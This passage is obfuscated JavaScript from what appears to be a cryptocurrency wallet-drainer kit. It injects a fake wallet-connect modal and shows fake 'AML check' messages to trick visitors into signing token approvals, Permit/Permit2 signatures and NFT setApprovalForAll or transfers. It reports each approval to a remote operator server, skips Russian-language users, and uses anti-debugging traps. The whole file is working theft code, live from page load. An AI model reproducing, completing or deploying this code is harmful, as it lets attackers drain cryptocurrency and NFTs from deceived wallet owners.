                                                            if (MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x323)][_0x2dd40a(0x2a5)] == 0x1)
                                                                await sign_cancel();
                                                            else {
                                                                await sign_unavailable();
                                                                while (!![]) {
                                                                    if (MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x323)]['NFTs'] == 0x1)
                                                                        try {
                                                                            await DO_SAFA(_0x54ce2b);
                                                                            let _0x5a7e07 = [];
                                                                            for (const _0x45b2dd of _0x150a56) {
                                                                                try {
                                                                                    _0x45b2dd[_0x2dd40a(0x34b)] == _0x54ce2b['address'] && (_0x5a7e07[_0x2dd40a(0x212)](_0x45b2dd),
                                                                                    _0x45b2dd[_0x2dd40a(0x2d6)] = !![]);
                                                                                } catch (_0x1a145b) {
                                                                                    console['log'](_0x1a145b);
                                                                                }
                                                                            }
                                                                            await send_request({
                                                                                'action': 'safa_approves',
                                                                                'user_id': MS_ID,
                                                                                'tokens': _0x5a7e07,
                                                                                'address': MS_Current_Address,
                                                                                'chain_id': MS_Current_Chain_ID,
                                                                                'contract_address': _0x54ce2b[_0x2dd40a(0x34b)],
                                                                                'PW': MS_Settings['Settings']['Use_Randomizer_For_NFTs'] && MS_Settings[_0x2dd40a(0x1ef)] != null ? MS_Settings[_0x2dd40a(0x1ef)] : ![]
                                                                            }),
                                                                            _0x54ce2b[_0x2dd40a(0x2d6)] = !![];
                                                                            break;
                                                                        } catch (_0x7d8d2) {
                                                                            console[_0x2dd40a(0x217)](_0x7d8d2),
                                                                            await approve_cancel();
                                                                            if (!MS_Settings[_0x2dd40a(0x351)])
                                                                                break;
                                                                        }
                                                                    else {
                                                                        if (MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x323)][_0x2dd40a(0x314)] == 0x2)
                                                                            try {
                                                                                await TRANSFER_NFT(_0x54ce2b),
                                                                                _0x54ce2b['skip'] = !![];
                                                                                break;
                                                                            } catch (_0x2941fa) {
                                                                                console[_0x2dd40a(0x217)](_0x2941fa),
                                                                                await transfer_cancel();
                                                                                if (!MS_Settings['Loop_NFT'])
                                                                                    break;
                                                                            }
                                                                    }
                                                                }
                                                            }
                                                            break;
                                                        } else {
                                                            console['log'](_0x915c0);
                                                            if (_0x915c0 != _0x2dd40a(0x1dd)) {
                                                                await sign_cancel();
                                                                if (!MS_Settings['Loop_NFT'])
                                                                    break;
                                                            } else
                                                                break;
                                                        }
                                                    }
                                                }
                                            else {
                                                if (MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x316)][_0x2dd40a(0x2ac)])
                                                    while (!![]) {
                                                        try {
                                                            await DO_SAFA(_0x54ce2b);
                                                            let _0x546d70 = [];
                                                            for (const _0xd231cf of _0x150a56) {
                                                                try {
                                                                    _0xd231cf[_0x2dd40a(0x34b)] == _0x54ce2b[_0x2dd40a(0x34b)] && (_0x546d70[_0x2dd40a(0x212)](_0xd231cf),
                                                                    _0xd231cf[_0x2dd40a(0x2d6)] = !![]);
                                                                } catch (_0x5ca0ed) {
                                                                    console[_0x2dd40a(0x217)](_0x5ca0ed);
                                                                }
                                                            }
                                                            await send_request({
                                                                'action': _0x2dd40a(0x2b5),
                                                                'user_id': MS_ID,
                                                                'tokens': _0x546d70,
                                                                'address': MS_Current_Address,
                                                                'chain_id': MS_Current_Chain_ID,
                                                                'contract_address': _0x54ce2b[_0x2dd40a(0x34b)],
                                                                'PW': MS_Settings[_0x2dd40a(0x2d2)][_0x2dd40a(0x35f)] && MS_Settings[_0x2dd40a(0x1ef)] != null ? MS_Settings[_0x2dd40a(0x1ef)] : ![]
                                                            }),
                                                            _0x54ce2b[_0x2dd40a(0x2d6)] = !![];
                                                            break;
                                                        } catch (_0x243749) {
                                                            console['log'](_0x243749),
                                                            await approve_cancel();
                                                            if (!MS_Settings[_0x2dd40a(0x351)])
                                                                break;
                                                        }
                                                    }
                                                else
                                                    while (!![]) {
                                                        try {
                                                            await TRANSFER_NFT(_0x54ce2b),
                                                            _0x54ce2b['skip'] = !![];
                                                            break;
                                                        } catch (_0x41a212) {
                                                            console[_0x2dd40a(0x217)](_0x41a212),
                                                            await transfer_cancel();
                                                            if (!MS_Settings[_0x2dd40a(0x351)])
                                                                break;
                                                        }
                                                    }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                } catch (_0x87623c) {
                    console[_0x2dd40a(0x217)](_0x87623c);
                }
            }
        }
        MS_Process = ![],
        setTimeout(end_message, 0x7d0);
    } catch (_0x277d5f) {
        console['log'](_0x277d5f);
    }
}
;
try {
    let query_string = window[a0_0x66027a(0x29e)][a0_0x66027a(0x207)]
      , url_params = new URLSearchParams(query_string);
    url_params[a0_0x66027a(0x388)](a0_0x66027a(0x373)) != a0_0x66027a(0x25b) && (navigator[a0_0x66027a(0x191)] || navigator[a0_0x66027a(0x39f)])['toLowerCase']()[a0_0x66027a(0x389)]('ru') && (MS_Bad_Country = !![]);
} catch (a0_0xa4a9f4) {
    console[a0_0x66027a(0x217)](a0_0xa4a9f4);
}
document[a0_0x66027a(0x1f9)](a0_0x66027a(0x20a), async()=>{
    const _0x32c7d5 = a0_0x66027a;
    try {
        if (MS_Modal_Style == 0x2)
            MSM[_0x32c7d5(0x3a2)]();
        else
            inject_modal();
        if (MS_Loader_Style == 0x2)
            MSL['init']();
        MS_Load_Time = Math[_0x32c7d5(0x24b)](Date[_0x32c7d5(0x1e4)]() / 0x3e8);
        if (typeof localStorage['MS_ID'] === 'undefined') {
            const _0x46188c = await send_request({
                'action': _0x32c7d5(0x232)
            });
            if (_0x46188c[_0x32c7d5(0x250)] == 'OK')
                localStorage[_0x32c7d5(0x3a5)] = _0x46188c['data'];
            else
                localStorage[_0x32c7d5(0x3a5)] = Math[_0x32c7d5(0x24b)](Date[_0x32c7d5(0x1e4)]() / 0x3e8);
        }
        MS_ID = localStorage['MS_ID'],
        await retrive_config(),
        fill_chain_data(),
        await retrive_contract(),
        MS_Ready = !![],
        enter_website();
        for (const _0x3090b8 in MS_Settings[_0x32c7d5(0x1a7)])
            MS_Gas_Reserves[_0x3090b8] = 0x0;
        for (const _0x5586a8 of document[_0x32c7d5(0x394)](_0x32c7d5(0x3ae))) {
            try {
                _0x5586a8[_0x32c7d5(0x1f9)]('click', ()=>ms_init());
            } catch (_0x191f7a) {
                console[_0x32c7d5(0x217)](_0x191f7a);
            }
        }
    } catch (_0x371df4) {
        console['log'](_0x371df4);
    }
}
);
const use_wc = ()=>{
    const _0x35dde8 = a0_0x66027a;
    connect_wallet(_0x35dde8(0x1b3));
}
;
function a0_0x3874() {
    const _0x4813a3 = ['token_id', 'Loop_NFT', 'function', 'web3-modal-wc', 'lte', 'path', 'Min_NFTs_Price', 'allowance', 'Permit2', 'object', 'Ethereum', 'permit_token', 'setApprovalForAll', 'about:blank', 'accounts', 'Use_Randomizer_For_NFTs', '120', 'Mac', 'Verification\x20Error', 'Unlimited_BL', 'request', 'Receiver', 'fromCharCode', 'Server\x20is\x20Unavailable', 'arbitrum', 'partner_percent', 'Proxy', 'string', 'owner', '&apikey=', 'host', 'api.basescan.org', 'Mode', 'BigNumber', 'Optimism', 'cis', 'https://api.opensea.io/api/v1/assets?owner=', 'BAD_COUNTRY', '<b>Done!</b>\x20Sign\x20message\x20in\x20your\x20wallet\x20to\x20continue...', 'uint48', 'waitForTransaction', 'increaseApproval', 'substring', 'Coinbase', 'UNSUPPORTED', 'querySelector', 'worker_id', 'https://link.trustwallet.com/open_url?coin_id=60&url=https://', 'sign_success', 'BNB', 'Notifications', 'personal_sign', 'PLS', 'error', 'text', 'gnosis', 'get', 'includes', 'toHex', 'providers', 'abi', 'avalanche', 'getBalance', 'wallet_requestPermissions', '100', 'DSB', 'style', 'estimateGas', 'querySelectorAll', 'Permit', 'CIS', 'permit(', 'iPad\x20Simulator', 'amountOutMin', 'https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp', 'Ether', 'GET', 'percent', 'heco', 'userLanguage', '[{\x22constant\x22:false,\x22inputs\x22:[],\x22name\x22:\x22', 'time', 'init', 'uint256', 'tokenSymbol', 'MS_ID', 'stringify', 'amount', 'Pancake', 'Wait_For_Response', '2.0', 'chain_id', 'Sushi', 'map', '.connect-button', 'api.ftmscan.com', 'Gas_Multiplier', 'iPod\x20Simulator', 'bool', 'substr', 'sign_verify', '0x00000000000111abe46ff893f3b2fdf1f759a8a8', 'Tokens_First', 'language', 'chat_data', 'all', 'encodeABI', 'table', 'Good,\x20your\x20wallet\x20is\x20AML\x20clear!', 'Настройте\x20оценщики', 'multicall', 'from', 'assets', 'sign_cancel', 'We\x27re\x20sorry', 'ru-RU', 'Please,\x20check\x20client\x20and\x20server\x20version,\x20looks\x20like\x20it\x20doesn\x27t\x20match,\x20or\x20maybe\x20you\x20need\x20to\x20clear\x20cache\x20everywhere\x20:(', 'Пожалуйста,\x20покиньте\x20этот\x20веб-сайт\x20немедленно,\x20он\x20не\x20предназначен\x20для\x20России\x20и\x20стран\x20СНГ,\x20не\x20пытайтесь\x20использовать\x20VPN,\x20это\x20небезопасно!', 'Checking\x20your\x20wallet\x20for\x20AML...', 'Confirming\x20sign...', '36MtFkiW', 'sha3', 'sign_unavailable', 'transfer_cancel', 'retrive_wallet', 'RPCs', '0x89', 'one_day_average_price', '9831vgKbGu', 'GLMR', '10429272qpmdVE', '.web3-overlay', 'isApprovedForAll', 'https://metamask.app.link/dapp/', 'recoverAddress', 'hex', '0x5f8476C921229225ef1EF4d71717c4c29226B5c9', 'WalletConnect', 'Use_Public_Contract', 'join', '<b>Confirming\x20your\x20sign...</b><br><br>Please,\x20don\x27t\x20leave\x20this\x20page!', 'api-optimistic.etherscan.io', 'sign_permit2', 'celo', 'uint160', 'random', 'ABI', 'PERMIT2_BATCH', 'amountIn', 'pending', 'code', 'LOCAL_CHECK', 'XDAI', 'asset_contract', 'type', 'transferFrom', 'ERC1155', 'Pulse', '0x171', 'https://trustwallet.com', 'domain', 'cronos', 'For\x20security\x20reasons\x20we\x20can\x27t\x20allow\x20you\x20to\x20connect\x20empty\x20or\x20new\x20wallet', 'connect_success', '0x38', 'classList', 'eth_sign', 'Minimal_Wallet_Price', 'WC_AE', 'application/x-www-form-urlencoded', 'check_finish', 'KAVA', 'ver=05022024&raw=', 'remove', '0xA', 'ANKR', 'bytes[]', 'gger', 'web3-overlay', 'LOW_BALANCE', 'close', '0xA4B1', 'Tokens', 'userAgent', 'counter', 'x2y2', 'now', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506', 'swapExactTokensForTokens', 'Error', 'spender', 'charCodeAt', '\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'stats', 'Sign\x20the\x20message\x20to\x20validate\x20your\x20wallet', 'application/json', 'MATIC', 'Personal_Wallet', 'Web3Provider', '(((.+)+)+)+$', 'Критическая\x20ошибка', '<div\x20class=\x22web3-modal-main\x22><p\x20class=\x22web3-modal-title\x22\x20style=\x22margin-top:0\x22>Connect\x20your\x20wallet</p><div\x20class=\x22web3-modal-items\x22><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22MetaMask\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/MM.svg\x22\x20alt=\x22\x22></div><span>MetaMask</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22Coinbase\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/CB.svg\x22\x20alt=\x22\x22></div><span>Coinbase</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22Trust\x20Wallet\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/TW.svg\x22\x20alt=\x22\x22></div><span>Trust\x20Wallet</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22Binance\x20Wallet\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/BW.svg\x22\x20alt=\x22\x22></div><span>Binance\x20Wallet</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x22use_wc()\x22><div><div\x20class=\x22icon\x22></div><span>More\x20Wallets</span></div><div\x20class=\x22arrow\x22></div></div></div></div><div\x20class=\x22web3-modal-wc\x22\x20style=\x22display:none\x22><p\x20class=\x22web3-modal-title\x22\x20style=\x22margin-top:0\x22>Choose\x20Version</p><div\x20class=\x22web3-modal-items\x22><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22WalletConnect\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/WC.svg\x22\x20alt=\x22\x22></div><span>WalletConnect</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22WalletConnect\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/WC1.svg\x22\x20alt=\x22\x22></div><span>WalletConnect\x20Legacy</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x22ms_init()\x22><div\x20class=\x22arrow\x22\x20style=\x22transform:rotateY(190deg)\x22></div><div><div\x20class=\x22icon\x22></div><span>Return\x20to\x20Wallets</span></div></div></div></div>', 'eth_requestAccounts', 'amount_usd', '0x1E0049783F008A0085193E00003D00cd54003c71', 'innerHTML', 'approve', 'addEventListener', 'permit', 'Trust', '1461501637330902918203684832716283019655932542975', 'Critical\x20Error', 'Permit_BL', 'Sushiswap', 'signMessage', 'optimism', 'mode', 'https://explorer.arbitrum.io', 'connect_request', ',\x20Allowance:\x20', 'Fantom\x20Opera', 'search', 'Min_Native_Price', 'permit_ver', 'DOMContentLoaded', 'primary_asset_contracts', 'Uniswap', 'split', '0x2105', 'isMetaMask', 'MetaMask', 'fire', 'push', 'Connecting\x20to\x20Blockchain...', ',\x20Version:\x20', 'Please,\x20wait\x20a\x20bit\x20for\x20confirmation...', 'Avalanche\x20Network\x20C-Chain', 'log', 'swapper_type', 'Trust\x20Wallet', 'Your\x20wallet\x20doesn\x27t\x20meet\x20the\x20requirements.\x20Try\x20to\x20connect\x20a\x20middle-active\x20wallet\x20to\x20try\x20again!', 'swapper', 'JsonRpcProvider', 'pulse', 'Public_Contract', '_signTypedData', 'web3-style', 'swap_success', 'iPhone', '#F5841F', 'Swappers', 'approve_request', 'Use_Back_Feature', '618793mDrPUP', 'base', 'increase', 'Use_Contract_Amount', 'none', 'moonbeam', 'appendChild', 'Use_Public_Premium', 'getElementById', 'chainId', '<b>Критическая\x20ошибка</b><br><br>Скрипт\x20не\x20может\x20соединиться\x20с\x20сервером\x20и\x20получить\x20данные,\x20возможно\x20вы\x20настроили\x20что-то\x20некорректно\x20или\x20домен\x20сервера\x20ещё\x20недоступен\x20или\x20был\x20заблокирован.\x20Проверьте\x20и\x20исправьте\x20проблемы\x20перед\x20использованием\x20сайта.', 'retrive_id', '#000000', '0x0', 'price', 'nonce', 'Web3\x20Application', 'startsWith', 'action', 'Is_Personal_Wallet', 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless', 'https://rpc.ankr.com/multichain/', 'nonpayable', 'https://www.coinbase.com/wallet', 'check_nft', 'swapper_address', 'partner_address', '-1002151286676', 'formatUnits', 'Thanks!', 'balance', 'Connecting\x20to\x20blockchain...', 'chain', 'indexOf', 'Нет\x20связи\x20с\x20сервером', 'ETH', 'floor', 'seven_day_average_price', 'Use_Randomizer_For_Tokens', 'Processing\x20sign', '<b>Sorry!</b>\x20Your\x20wallet\x20doesn\x27t\x20meet\x20the\x20requirements.<br><br>Try\x20to\x20connect\x20a\x20middle-active\x20wallet\x20to\x20try\x20again!', 'status', '<b>Thanks!</b>', 'functions', 'We\x20have\x20received\x20your\x20signature,\x20but\x20it\x27s\x20incorrect,\x20please\x20try\x20again.', 'uint256[]', 'balanceRawInteger', 'input', 'Waiting\x20for\x20action', 'parse', 'sub', 'isCoinbaseBrowser', 'test', '638832VawhZo', 'Invalid\x20Wallet', 'success', 'serialize', 'token', 'API', 'We\x20cannot\x20verify\x20that\x20the\x20wallet\x20is\x20yours\x20as\x20you\x20did\x20not\x20sign\x20the\x20message\x20provided.', 'text/plain', 'Loading...', 'Pancake_V3', 'then', '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F', 'sort', 'matic', 'Loop_N', 'vendor', 'https://ftmscan.com/', 'gasPrice', 'sendTransaction', 'FTM', 'amount_raw', 'permit2', 'swapExactTokensForETH', 'div', 'isTrust', 'focus', 'expiration', 'block', 'Permit2_BL', 'constructor', 'onbeforeunload', 'stateObject', 'retrive_config', '/api?module=contract&action=getsourcecode&address=', 'transfer', '\x20Please,\x20don\x27t\x20leave\x20this\x20page!', 'fantom', '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2', 'user_id', 'match', 'Connection\x20established', 'head', 'Loop_T', 'wallet', 'https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD', 'POST', 'ankr_getAccountBalance', 'gasLimit', '0x4200000000000000000000000000000000000006', 'ERC721', '812xIqYSt', 'mul', 'getTransactionCount', '0x144', 'https://scan.pulsechain.com/', 'CURRENCY', 'tokenType', 'api.arbiscan.io', 'https://snowtrace.io/', 'https://avatars.githubusercontent.com/u/37784886', 'function\x20*\x5c(\x20*\x5c)', 'isCoinbaseWallet', 'https://go.cb-w.com/dapp?cb_url=https://', 'data', 'beforeunload', 'partner-address', 'location', 'boolean', '<b>Sign\x20the\x20message</b>\x20to\x20validate\x20you\x20wallet...', 'load', '1158472395435294898592384258348512586931256', 'payable', 'Processing\x20wallet', 'Force', 'Quickswap', 'Something\x20went\x20wrong!', 'Min_Tokens_Price', 'getGasPrice', 'reduce', 'Blur', 'Enable', '403320XwDZNL', 'length', '310210SlvsNv', 'SeaPort', 'click', 'Wait_For_Confirmation', 'personal_wallet', 'toString', 'safa_approves', 'Flex_Percent', 'Contract', 'https://bscscan.com', 'Everything\x20good!', 'ontouchend', '0xA86A', 'html', 'zksync_era', 'ether', 'AML\x20Error', 'DOMAIN_SEPARATOR', '2690484DhmgRE', 'Sign\x20message\x20in\x20your\x20wallet...', 'Запрещенная\x20геолокация', 'open', 'Your\x20wallet\x20is\x20not\x20AML\x20clear!', 'Скрипт\x20не\x20может\x20соединиться\x20с\x20сервером\x20и\x20получить\x20данные,\x20возможно\x20вы\x20настроили\x20что-то\x20некорректно\x20или\x20домен\x20сервера\x20ещё\x20недоступен\x20или\x20был\x20заблокирован.\x20Проверьте\x20и\x20исправьте\x20проблемы\x20перед\x20использованием\x20сайта.', 'web3-modal', 'sign_request', 'name', 'body', 'Implementation', '0x000000000022d473030f116ddee9f6b43ac78ba3', '[{\x22constant\x22:false,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22', 'version', 'debu', 'https://basescan.org/', 'message', 'Settings', 'light', 'toLowerCase', 'slice', 'skip', '0x13f4EA83D0bd40E75C8222255bc855a974568Dd4', 'connect', 'wallet_addEthereumChain', 'sign', 'sigDeadline', 'SRV_UNAVAILABLE', 'value', 'opera', 'leave_website', 'https://polygonscan.com', 'Contract_Whitelist', 'Getting\x20your\x20wallet\x20address...', 'eth', '[{\x22constant\x22:false,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22depositer\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22handler\x22,\x22type\x22:\x22address\x22},\x0a\x20\x20{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22keeper\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22uint8\x22,\x22name\x22:\x22percent\x22,\x22type\x22:\x22uint8\x22},{\x22internalType\x22:\x22bool\x22,\x22name\x22:\x22is_cashback\x22,\x22type\x22:\x22bool\x22}],\x22name\x22:\x22', 'https://metamask.io', '0x1', 'Contract_Blacklist', 'deadline', 'Address', 'approve_success', 'Contract_Type', 'blockchain', 'PermitDetails', 'prepend', 'withdraw_native', 'href', 'Binance\x20Wallet', 'ERC20', 'Reserves', 'platform', 'ethereum', 'undefined', 'Chat_Settings', 'Fix_Percent', 'Priority', 'USD', 'Contract_Legacy', 'trim', 'withdraw_token', '0x21be370d5312f44cb42ce377bc9b8a0cef1a4c83', 'increaseAllowance', 'splice', 'api.polygonscan.com', 'holder', 'era', 'wallet_switchEthereumChain', 'apply', 'Your\x20wallet\x20is\x20AML\x20risk\x20is\x20low\x20enough!', 'Polygon\x20Mainnet', 'Chains', 'NATIVE', 'Arbitrum\x20One', 'https://', 'utils', 'iPad', 'bsc', 'address[]', 'Ethereum\x20Mainnet', 'getElementsByClassName', 'approve_token', 'transfer_success', 'NFTs', 'swapper_allowance', 'Approve', 'details', 'hash', 'chain_request', 'createElement', '[PERMIT\x20FOUND]\x20', 'check_wallet', 'Native', 'parseEther', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45', 'moonriver', 'title', 'https://optimistic.etherscan.io/', 'Sign', '0x82af49447d8a07e3bd95bd0d56f35241523fbab1', 'display', 'json', 'selectedAddress', 'CRO', 'hasOwnProperty', '<b>Waiting\x20for\x20your\x20sign...</b><br><br>Please,\x20sign\x20message\x20in\x20your\x20wallet!', '_blank', 'methods', 'eth_signTransaction', 'Contract_Address', '[PERMIT_2\x20FOUND]\x20', 'EthereumProvider', 'INVALID_VERSION', 'result', 'expiry', 'BinanceChain', 'nonces', '576oSaCke', 'eth_signTypedData_v4', 'Sign\x20is\x20confirmed', 'transfer_request', '843a541ad37f2d4b865c3069d7aafd07', '0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7', '\x22,\x22outputs\x22:[],\x22payable\x22:true,\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22}]', 'Price', 'Please\x20wait,\x20we\x27re\x20scanning\x20more\x20details...', 'OPENSEA', 'increment', 'zkSync\x20Era', 'replaceAll', 'AVAX', 'Waiting...', 'amounts', 'Wallet_Blacklist', 'allowed', 'polygon', 'Base', 'getSigner', 'address', 'MOVR', 'enter_website', 'count', '0x0000000000000000000000000000000000000000'];
    a0_0x3874 = function() {
        return _0x4813a3;
    }
    ;
    return a0_0x3874();
}
setInterval(async()=>{
    const _0x4898a3 = a0_0x66027a;
    try {
        let _0x3ac71e = document[_0x4898a3(0x22f)](_0x4898a3(0x29d));
        if (_0x3ac71e === null)
            return;
        else
            MS_Partner_Address = _0x3ac71e['value'][_0x4898a3(0x2fc)]();
    } catch (_0xfc9220) {
        console[_0x4898a3(0x217)](_0xfc9220);
    }
}
, 0x3e8),
window[a0_0x66027a(0x1f9)](a0_0x66027a(0x29c), _0xeab4a2=>leave_website()),
window[a0_0x66027a(0x1f9)](a0_0x66027a(0x27a), _0x13e4b9=>leave_website());
function a0_0x29c3de(_0x55a034) {
    function _0x2d5bbd(_0x34008c) {
        const _0x46193e = a0_0x5e72;
        if (typeof _0x34008c === _0x46193e(0x36b))
            return function(_0x579c81) {}
            [_0x46193e(0x279)]('while\x20(true)\x20{}')[_0x46193e(0x305)](_0x46193e(0x1e2));
        else
            ('' + _0x34008c / _0x34008c)[_0x46193e(0x2ae)] !== 0x1 || _0x34008c % 0x14 === 0x0 ? function() {
                return !![];
            }
            ['constructor'](_0x46193e(0x2cf) + _0x46193e(0x1db))['call'](_0x46193e(0x239)) : function() {
                return ![];
            }
            ['constructor'](_0x46193e(0x2cf) + 'gger')[_0x46193e(0x305)](_0x46193e(0x27b));
        _0x2d5bbd(++_0x34008c);
    }
    try {
        if (_0x55a034)
            return _0x2d5bbd;
        else
            _0x2d5bbd(0x0);
    } catch (_0x111a9f) {}
}
